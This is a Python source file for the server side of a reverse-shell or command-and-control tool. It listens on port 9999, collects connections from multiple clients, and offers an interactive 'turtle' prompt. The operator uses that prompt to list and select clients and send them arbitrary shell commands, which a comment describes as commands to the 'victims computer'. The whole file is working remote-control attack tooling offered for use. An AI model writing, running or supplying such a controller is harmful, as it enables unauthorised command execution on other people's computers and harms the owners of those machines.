# dependencies
import sys
import socket
import threading
import time

from queue import Queue

# global
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]

queue = Queue()
all_connections = []
all_addresses = []


# function
## create a socket ( connect two pcs )
def create_socket():
    global host
    global port
    global sock

    try:
        host = ''
        port = 9999
        sock = socket.socket()
        print('Socket has been created...')
    except socket.error as err:
        print(f'Failed to create socket: {err}')


## binding the socket and listening for connection
def bind_socket():
    global host
    global port
    global sock

    try:
        sock.bind((host, port))
        sock.listen(5)
        print(f'Binding the socket at PORT: {port}')
    except socket.error as err:
        print(f'Socket binding failed: {err}\nRetrying...')
        bind_socket()


# handling connection from multiple client and saving to a list
## closing previous connections when server.py file is restarted
def accepting_all_connections():
    for conn in all_connections:
        conn.close()

    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, address = sock.accept()
            sock.setblocking(1)  # prevent timeout from happening
            all_connections.append(conn)
            all_addresses.append(address)

            print(f'Connection has been established {address[0]}')
        except:
            print('Error accepting connections')


# 2nd thread functions - 1) see all the clients 2) select a client 3) send command to the connected client
## interactive prompt for sending commands
def start_turtle():
    while True:
        cmd = input('turtle:> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print(f'Specified command not recognizing...')


# display all the active connections with the client
def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue

        results = str(i) + ' ' + str(all_addresses[i][0]) + ' | ' + str(all_addresses[i][1]) + '\n'

    print(f'------ CLIENTS ------\n{results}')


# selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ', '')  # target = id
        target = int(target)
        conn = all_connections[target]

        print(f'You are connected to: {str(all_addresses[target][0])}')
        print(f'{str(all_addresses[target][0])}:> ', end='')

        return conn
    except:
        print('Selection not valid...')
        return None


# send commands to victims computer
def send_target_commands(conn):
    global sock

    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                resp = str(conn.recv(20480), 'utf-8')
                print(resp, end='')
        except:
            print(f'Error sending commands...')
            break


# create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        thread = threading.Thread(target=work)
        thread.daemon = True
        thread.start()


# add jobs value to the queue
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


# do next job that is in the queue ( handle connection, send commands )
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_all_connections()
        elif x == 2:
            time.sleep(2)
            start_turtle()

        queue.task_done()


## main
def main():
    create_workers()
    create_jobs()


# run
if __name__ == '__main__':
    main()
